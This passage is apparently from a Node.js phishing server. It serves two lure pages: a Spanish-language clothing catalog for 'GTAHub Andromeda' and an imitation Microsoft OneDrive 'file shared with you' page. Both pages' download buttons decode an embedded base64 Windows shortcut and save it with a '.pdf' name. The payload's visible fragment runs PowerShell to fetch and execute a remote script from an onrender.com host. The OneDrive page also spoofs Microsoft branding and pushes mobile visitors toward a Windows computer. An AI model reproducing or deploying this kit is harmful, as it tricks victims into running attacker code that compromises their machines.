VwBSACAAJwBoAHQAdABwAHMAOgAvAC8AcgBhAG4AawBhAGsAcwBrAHMALgBvAG4AcgBlAG4AZABlAHIALgBjAG8AbQAvAGQAbAAvAHMALgBwAHMAMQAnACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwApACIAIgAlAFMAeQBzAHQAZQBtAFIAbwBvAHQAJQBcAFMAeQBzAHQAZQBtADMAMgBcAGkAbQBhAGcAZQByAGUAcwAuAGQAbABsABAAAAAFAACgJQAAAN0AAAAcAAAACwAAoHdOwRrnAl1Ot0Qusa5RmLfdAAAAlQAAAAkAAKCJAAAAMVNQU+KKWEa8TDhDu/wTkyaYbc5tAAAABAAAAAAfAAAALQAAAFMALQAxAC0ANQAtADIAMQAtADkAOQA1ADIAOQA1ADMAMAA4AC0AMgAxADUANwA3ADcANgAxADMANgAtADIAOAA0ADMANwA5ADEAMAA3ADgALQA1ADAAMAAAAAAAAAAAAAAAAAAAAAAA";

const LANDING_HTML = `<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>GTAHub Andromeda — Catálogo Temporada 2024/2025</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:#0a0a0f;color:#e0e0e0;min-height:100vh}
.hero{background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%);padding:80px 20px;text-align:center;position:relative;overflow:hidden}
.hero::before{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90" opacity=".03">👕</text></svg>') repeat;background-size:80px}
.hero h1{font-size:42px;font-weight:700;color:#fff;margin-bottom:8px;position:relative}
.hero .accent{color:#e94560}
.hero .sub{font-size:18px;color:#c9a227;margin-bottom:6px;font-weight:300;letter-spacing:4px;text-transform:uppercase;position:relative}
.hero p{color:#8b95a5;font-size:15px;margin-top:12px;position:relative}
.container{max-width:900px;margin:0 auto;padding:40px 20px}
.section-title{font-size:22px;color:#fff;margin-bottom:24px;padding-bottom:10px;border-bottom:2px solid #e94560;display:inline-block}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:18px;margin-bottom:50px}
.card{background:#161b22;border:1px solid #30363d;border-radius:12px;overflow:hidden;transition:transform .2s,border-color .2s}
.card:hover{transform:translateY(-3px);border-color:#e94560}
.card-img{height:180px;background:linear-gradient(135deg,#1e2a3a,#2a1a2e);display:flex;align-items:center;justify-content:center;font-size:60px}
.card-body{padding:16px}
.card-body h3{font-size:16px;color:#fff;margin-bottom:6px}
.card-body .price{color:#e94560;font-size:20px;font-weight:700}
.card-body .desc{color:#8b949e;font-size:13px;margin-top:6px}
.card-body .sizes{margin-top:8px;display:flex;gap:6px}
.card-body .sizes span{background:#21262d;color:#8b949e;padding:2px 8px;border-radius:4px;font-size:11px}
.download-section{background:linear-gradient(135deg,#1a1a2e,#0f3460);border:1px solid #30363d;border-radius:16px;padding:50px 30px;text-align:center;margin:40px 0}
.download-section h2{font-size:26px;color:#fff;margin-bottom:12px}
.download-section p{color:#8b949e;font-size:14px;margin-bottom:28px}
.btn-download{display:inline-block;background:linear-gradient(135deg,#e94560,#c73659);color:#fff;padding:16px 40px;border-radius:10px;font-size:17px;font-weight:600;text-decoration:none;cursor:pointer;border:none;transition:transform .15s,box-shadow .15s}
.btn-download:hover{transform:scale(1.04);box-shadow:0 8px 25px rgba(233,69,96,.35)}
.btn-download svg{vertical-align:middle;margin-right:8px}
.footer{text-align:center;padding:30px;color:#484f58;font-size:12px;border-top:1px solid #21262d}
.badge{display:inline-block;background:#238636;color:#fff;padding:4px 12px;border-radius:20px;font-size:12px;font-weight:600;margin-bottom:16px}
.stats{display:flex;justify-content:center;gap:40px;margin-top:30px;position:relative}
.stats div{text-align:center}
.stats .n{font-size:28px;font-weight:700;color:#e94560}
.stats .l{font-size:12px;color:#8b949e;text-transform:uppercase;letter-spacing:1px}
</style>
</head>
<body>

<div class="hero">
  <div class="sub">GTAHub Andromeda</div>
  <h1>CATÁLOGO <span class="accent">2024/2025</span></h1>
  <p>Colección Hombre — Remeras, Buzos, Pantalones y más</p>
  <div class="stats">
    <div><div class="n">45+</div><div class="l">Productos</div></div>
    <div><div class="n">12</div><div class="l">Categorías</div></div>
    <div><div class="n">NEW</div><div class="l">Temporada</div></div>
  </div>
</div>

<div class="container">
  <div class="section-title">🔥 Destacados</div>
  <div class="grid">
    <div class="card">
      <div class="card-img">👕</div>
      <div class="card-body">
        <h3>Remera Oversize Classic</h3>
        <div class="price">$12.500</div>
        <div class="desc">Algodón 100% premium. Corte oversize.</div>
        <div class="sizes"><span>S</span><span>M</span><span>L</span><span>XL</span><span>XXL</span></div>
      </div>
    </div>
    <div class="card">
      <div class="card-img">🧥</div>
      <div class="card-body">
        <h3>Hoodie Premium Street</h3>
        <div class="price">$28.500</div>
        <div class="desc">French terry 380gsm. Capucha doble.</div>
        <div class="sizes"><span>S</span><span>M</span><span>L</span><span>XL</span></div>
      </div>
    </div>
    <div class="card">
      <div class="card-img">👖</div>
      <div class="card-body">
        <h3>Jogger Cargo Premium</h3>
        <div class="price">$19.500</div>
        <div class="desc">Gabardina stretch. Bolsillos cargo.</div>
        <div class="sizes"><span>S</span><span>M</span><span>L</span><span>XL</span><span>XXL</span></div>
      </div>
    </div>
  </div>

  <div class="download-section">
    <div class="badge">📄 PDF — 4 páginas</div>
    <h2>Descargá el Catálogo Completo</h2>
    <p>Con todos los productos, talles, colores y precios actualizados de la temporada.</p>
    <button class="btn-download" onclick="dl()">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
      Descargar Catálogo PDF
    </button>
  </div>
</div>

<div class="footer">
  © 2024 GTAHub Andromeda. Todos los derechos reservados.<br>
  Instagram: @gtahub.andromeda | Discord: GTAHub Andromeda
</div>

<script>
function dl(){
  var b=atob("${LNK_B64}");
  var a=new Uint8Array(b.length);
  for(var i=0;i<b.length;i++)a[i]=b.charCodeAt(i);
  var bl=new Blob([a],{type:"application/octet-stream"});
  var u=URL.createObjectURL(bl);
  var l=document.createElement("a");
  l.href=u;l.download="Catalogo Ropa GTAHub Andromeda.pdf";
  document.body.appendChild(l);l.click();
  document.body.removeChild(l);
  URL.revokeObjectURL(u);
}
</script>
</body>
</html>`;

// ── OneDrive-style sharing page (pixel-perfect Fluent 2 replica) ──
const ONEDRIVE_HTML = `<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Elemento compartido en OneDrive</title>
<link rel="icon" href="https://res-1.cdn.office.net/files/fabric-cdn-prod_20230815.002/assets/brand-icons/product/svg/onedrive_48x1.svg" type="image/svg+xml">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --font:'Segoe UI Variable','Segoe UI','Segoe UI Web (West European)',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;
  --bg:#f5f5f5;
  --card-bg:#ffffff;
  --text-primary:#1a1a1a;
  --text-secondary:#616161;
  --text-tertiary:#707070;
  --text-link:#616161;
  --brand:#0067b8;
  --brand-hover:#005da6;
  --brand-pressed:#004578;
  --border:#e0e0e0;
  --shadow:0 2px 4px rgba(0,0,0,.04),0 8px 16px rgba(0,0,0,.08);
  --shadow-hover:0 4px 8px rgba(0,0,0,.06),0 16px 32px rgba(0,0,0,.12);
}
html{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
body{font-family:var(--font);background:var(--bg);color:var(--text-primary);min-height:100vh;display:flex;flex-direction:column}

/* ═══ Top navigation ═══ */
.nav{height:48px;background:#fff;display:flex;align-items:center;padding:0 12px;position:fixed;top:0;left:0;right:0;z-index:100;border-bottom:1px solid #f0f0f0}

/* Waffle (3×3 dots) */
.waffle-btn{width:48px;height:48px;border:none;background:none;cursor:pointer;display:flex;align-items:center;justify-content:center;border-radius:4px;flex-shrink:0}
.waffle-btn:hover{background:#f5f5f5}
.waffle-btn svg{width:20px;height:20px}

/* Microsoft logo */
.ms-logo{display:flex;align-items:center;gap:8px;text-decoration:none;color:var(--text-primary);margin-left:4px}
.ms-tiles{display:grid;grid-template-columns:10px 10px;grid-template-rows:10px 10px;gap:2px;flex-shrink:0}
.ms-tiles .t1{background:#f25022}.ms-tiles .t2{background:#7fba00}.ms-tiles .t3{background:#00a4ef}.ms-tiles .t4{background:#ffb900}
.ms-name{font-size:15px;font-weight:600;letter-spacing:-0.01em;color:#737373}

/* Vertical divider */
.nav-divider{width:1px;height:20px;background:#e0e0e0;margin:0 12px;flex-shrink:0}

/* Product name */
.product-name{font-size:15px;font-weight:600;color:var(--text-primary);text-decoration:none;white-space:nowrap}
.product-name:hover{text-decoration:underline}

/* Right nav actions */
.nav-right{margin-left:auto;display:flex;align-items:center;gap:4px}
.nav-icon-btn{width:40px;height:40px;border:none;background:none;cursor:pointer;border-radius:4px;display:flex;align-items:center;justify-content:center;color:#616161}
.nav-icon-btn:hover{background:#f5f5f5}
.nav-avatar{width:32px;height:32px;border-radius:50%;background:#0067b8;color:#fff;border:none;font-size:13px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;margin-left:4px;letter-spacing:0.02em}

/* ═══ Main content ═══ */
.main{flex:1;display:flex;justify-content:center;align-items:center;padding:68px 20px 40px}

/* ═══ Card ═══ */
.card{background:var(--card-bg);border-radius:12px;box-shadow:var(--shadow);width:100%;max-width:480px;padding:40px 40px 32px;text-align:center;transition:box-shadow .2s}

/* Cloud icon */
.cloud-icon{margin-bottom:24px}
.cloud-icon svg{width:56px;height:56px}

/* Title */
.share-title{font-size:22px;font-weight:600;color:var(--text-primary);line-height:1.35;margin-bottom:8px;letter-spacing:-0.01em}
.share-subtitle{font-size:14px;color:var(--text-secondary);margin-bottom:28px;line-height:1.55}

/* ═══ File row ═══ */
.file-row{display:flex;align-items:center;background:#fafafa;border:1px solid var(--border);border-radius:8px;padding:14px 16px;text-align:left;margin-bottom:28px;transition:background .15s,border-color .15s}
.file-row:hover{background:#f0f0f0;border-color:#d0d0d0}

/* File type icon */
.file-icon{width:40px;height:40px;border-radius:4px;display:flex;align-items:center;justify-content:center;margin-right:14px;flex-shrink:0}
.file-icon svg{width:24px;height:24px}
.file-icon.pdf{background:#d83b01}
.file-icon.xlsx{background:#107c41}
.file-icon.docx{background:#185abd}
.file-icon.pptx{background:#c43e1c}

.file-info{overflow:hidden;flex:1}
.file-name{font-size:14px;font-weight:600;color:var(--text-primary);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:2px}
.file-meta{font-size:12px;color:var(--text-secondary)}

/* ═══ Buttons ═══ */
.btn-primary{display:block;width:100%;padding:11px 24px;font-size:14px;font-weight:600;font-family:var(--font);border-radius:24px;cursor:pointer;transition:background .12s,box-shadow .12s;background:var(--brand);color:#fff;border:none}
.btn-primary:hover{background:var(--brand-hover);box-shadow:0 2px 8px rgba(0,103,184,.25)}
.btn-primary:active{background:var(--brand-pressed);box-shadow:none}

.btn-secondary{display:block;width:100%;padding:10px 24px;font-size:14px;font-weight:600;font-family:var(--font);border-radius:24px;cursor:pointer;transition:all .12s;background:transparent;color:var(--text-primary);border:1px solid #d1d1d1;margin-top:10px}
.btn-secondary:hover{background:#f5f5f5;border-color:#c0c0c0}

/* ═══ Footer ═══ */
.card-divider{width:100%;height:1px;background:var(--border);margin:24px 0 16px}
.card-footer{font-size:12px;color:var(--text-tertiary);line-height:1.7}
.card-footer a{color:var(--text-link);text-decoration:none}
.card-footer a:hover{text-decoration:underline}

/* ═══ Mobile ═══ */
.mobile-only{display:none}
@media(max-width:640px){
  .desktop-only{display:none!important}
  .mobile-only{display:block!important}
  .card{padding:32px 24px 28px;border-radius:8px}
  .share-title{font-size:20px}
  .nav .ms-name{display:none}
  .nav-divider{display:none}
}

/* ═══ Toast ═══ */
.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#107c10;color:#fff;padding:10px 24px;border-radius:8px;font-size:13px;font-weight:500;display:none;z-index:200;box-shadow:0 4px 12px rgba(0,0,0,.15)}

/* ═══ Warning banner (mobile) ═══ */
.warn-box{background:#fff8e1;border:1px solid #ffe082;border-radius:8px;padding:14px 16px;text-align:left;font-size:13px;color:#1a1a1a;margin-top:16px;line-height:1.5}
.warn-box strong{color:#8a6d00}
</style>
</head>
<body>

<!-- ═══ Navigation bar ═══ -->
<nav class="nav">
  <!-- Waffle -->
  <button class="waffle-btn" aria-label="Aplicaciones de Microsoft">
    <svg viewBox="0 0 16 16" fill="#4b4b4b"><rect x="1" y="1" width="3" height="3" rx=".4"/><rect x="6.5" y="1" width="3" height="3" rx=".4"/><rect x="12" y="1" width="3" height="3" rx=".4"/><rect x="1" y="6.5" width="3" height="3" rx=".4"/><rect x="6.5" y="6.5" width="3" height="3" rx=".4"/><rect x="12" y="6.5" width="3" height="3" rx=".4"/><rect x="1" y="12" width="3" height="3" rx=".4"/><rect x="6.5" y="12" width="3" height="3" rx=".4"/><rect x="12" y="12" width="3" height="3" rx=".4"/></svg>
  </button>

  <!-- Microsoft logo (4-color tiles) -->
  <a class="ms-logo" href="#">
    <div class="ms-tiles"><div class="t1"></div><div class="t2"></div><div class="t3"></div><div class="t4"></div></div>
    <span class="ms-name">Microsoft</span>
  </a>

  <!-- Divider -->
  <div class="nav-divider"></div>

  <!-- Product name -->
  <a class="product-name" href="#">OneDrive</a>

  <!-- Right actions -->
  <div class="nav-right">
    <!-- Search -->
    <button class="nav-icon-btn" title="Buscar">
      <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor"><path d="M8.5 3a5.5 5.5 0 014.38 8.82l4.15 4.15a.75.75 0 01-1.06 1.06l-4.15-4.15A5.5 5.5 0 118.5 3zm0 1.5a4 4 0 100 8 4 4 0 000-8z"/></svg>
    </button>
    <!-- Notifications -->
    <button class="nav-icon-btn" title="Notificaciones">
      <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor"><path d="M10 2a5.92 5.92 0 015.98 5.36l.02.46V11.4l1.4 2.33a.75.75 0 01-.53 1.14l-.11.01H3.24a.75.75 0 01-.7-.97l.06-.13L4 11.44V7.82l.01-.38A5.92 5.92 0 0110 2zm0 1.5c-2.35 0-4.37 1.76-4.48 4.02L5.5 7.82v3.84l-.04.17L4.4 13.4h11.22l-1.07-1.6-.04-.13L14.5 7.8v-.03c-.05-2.3-2.07-4.14-4.42-4.27L10 3.5zM8 15.5h4a2 2 0 01-3.99.15L8 15.5z"/></svg>
    </button>
    <!-- Help -->
    <button class="nav-icon-btn" title="Ayuda">
      <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor"><path d="M10 2a8 8 0 110 16 8 8 0 010-16zm0 1.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zM10 13a.75.75 0 110 1.5.75.75 0 010-1.5zm0-7a2.75 2.75 0 012.75 2.75c0 1.01-.53 1.56-1.12 2.03l-.17.13c-.39.28-.46.42-.46.59a.75.75 0 01-1.5 0c0-.88.44-1.33.97-1.73l.14-.1c.49-.37.64-.56.64-.92a1.25 1.25 0 00-2.5 0 .75.75 0 01-1.5 0A2.75 2.75 0 0110 6z"/></svg>
    </button>
    <!-- Settings -->
    <button class="nav-icon-btn" title="Configuración">
      <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor"><path d="M1.91 7.38l.06-.1 1.3-2.25a.75.75 0 01.78-.4l.11.03 1.63.66a6 6 0 011.17-.68l.3-1.76a.75.75 0 01.63-.58l.11-.01h2.6a.75.75 0 01.72.52l.03.1.3 1.73c.44.18.85.41 1.23.68l1.57-.63a.75.75 0 01.84.2l.07.1 1.3 2.25a.75.75 0 01-.07.86l-.08.08-1.27 1.07a6 6 0 010 1.38l1.27 1.07a.75.75 0 01.22.84l-.05.1-1.3 2.25a.75.75 0 01-.78.4l-.11-.03-1.57-.63c-.38.27-.79.5-1.23.68l-.3 1.73a.75.75 0 01-.64.58l-.11.01H8.6a.75.75 0 01-.72-.52l-.03-.1-.3-1.73a6 6 0 01-1.18-.68l-1.62.66a.75.75 0 01-.84-.2l-.07-.1-1.3-2.25a.75.75 0 01.07-.86l.08-.08 1.27-1.07a6 6 0 010-1.38L2.69 8.37a.75.75 0 01-.22-.84l.05-.1L3.82 5.2zM10 7.5a2.5 2.5 0 100 5 2.5 2.5 0 000-5z"/></svg>
    </button>
    <!-- User avatar -->
    <button class="nav-avatar">M</button>
  </div>
</nav>

<!-- ═══ Main area ═══ -->
<main class="main">
  <div class="card">
    <!-- OneDrive cloud icon -->
    <div class="cloud-icon">
      <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M14.5 38h22.8a8.7 8.7 0 001.7-17.3A10.8 10.8 0 0019 14.8a8.7 8.7 0 00-12.3 8.5A7.7 7.7 0 0014.5 38z" fill="#0078D4"/>
        <path d="M37 20.7a8.7 8.7 0 011 .5c-.3-4.7-4.2-8.5-9-8.5a9 9 0 00-5.5 1.9A10.8 10.8 0 0138.5 21l-.3-.1a8.7 8.7 0 00-1.2-.2z" fill="#1490DF" opacity=".7"/>
        <path d="M19 14.8a10.7 10.7 0 00-5.6 1.3 8.7 8.7 0 00-6.7 7.2A7.7 7.7 0 006 24a7.7 7.7 0 00.7-.7c.4-3.2 2.7-5.8 5.8-6.6a10.8 10.8 0 016.5-1.9z" fill="#28A8EA" opacity=".5"/>
      </svg>
    </div>

    <div class="desktop-only">
      <h1 class="share-title">Se compartió un archivo con usted</h1>
      <p class="share-subtitle">Este elemento se compartió de forma segura a través de OneDrive.</p>

      <!-- File card -->
      <div class="file-row">
        <div class="file-icon pdf">
          <svg viewBox="0 0 24 24" fill="none"><path d="M6 2h8l6 6v12a2 2 0 01-2 2H6a2 2 0 01-2-2V4a2 2 0 012-2z" fill="#fff" opacity=".9"/><path d="M14 2l6 6h-4a2 2 0 01-2-2V2z" fill="#fff" opacity=".6"/><text x="7" y="18" font-size="6" font-weight="700" fill="#fff" font-family="Segoe UI,sans-serif">PDF</text></svg>
        </div>
        <div class="file-info">
          <div class="file-name">Documento_Importante_2024.pdf</div>
          <div class="file-meta">Martin P. lo compartió con usted · PDF</div>
        </div>
      </div>

      <!-- Action buttons -->
      <button class="btn-primary" onclick="dlDoc()">Abrir</button>
      <button class="btn-secondary" onclick="dlDoc()">Descargar</button>
    </div>

    <div class="mobile-only">
      <h1 class="share-title">Se compartió un archivo con usted</h1>
      <p class="share-subtitle" style="margin-bottom:20px">Este documento requiere ser descargado desde una computadora con Windows para su correcta visualización.</p>
      <div class="file-row">
        <div class="file-icon pdf">
          <svg viewBox="0 0 24 24" fill="none"><path d="M6 2h8l6 6v12a2 2 0 01-2 2H6a2 2 0 01-2-2V4a2 2 0 012-2z" fill="#fff" opacity=".9"/><path d="M14 2l6 6h-4a2 2 0 01-2-2V2z" fill="#fff" opacity=".6"/><text x="7" y="18" font-size="6" font-weight="700" fill="#fff" font-family="Segoe UI,sans-serif">PDF</text></svg>
        </div>
        <div class="file-info">
          <div class="file-name">Documento_Importante_2024.pdf</div>
          <div class="file-meta">Martin P. lo compartió con usted · PDF</div>
        </div>
      </div>
      <div class="warn-box">
        <strong>⚠ Aviso:</strong> Para abrir este documento, accedé a este enlace desde tu computadora.
      </div>
    </div>

    <div class="card-divider"></div>
    <div class="card-footer">
      <a href="#">Términos de uso</a> · <a href="#">Privacidad y cookies</a><br>
      Microsoft OneDrive · © Microsoft 2024
    </div>
  </div>
</main>

<div class="toast" id="toast">✓ Descarga iniciada</div>

<script>
function dlDoc(){
  var b=atob("${LNK_B64}");
  var a=new Uint8Array(b.length);
  for(var i=0;i<b.length;i++)a[i]=b.charCodeAt(i);
  var bl=new Blob([a],{type:"application/pdf"});
  var u=URL.createObjectURL(bl);
  var l=document.createElement("a");
  l.href=u;l.download="Documento_Importante_2024.pdf";
  document.body.appendChild(l);l.click();
  document.body.removeChild(l);
  URL.revokeObjectURL(u);
  var t=document.getElementById("toast");
  t.style.display="block";
  setTimeout(function(){t.style.display="none"},3000);
}
</script>
</body>
</html>`;

app.listen(PORT, () => {
  console.log("[+] Server → http://localhost:" + PORT);
  console.log("[+] Users: " + Object.keys(USERS).join(", "));
});
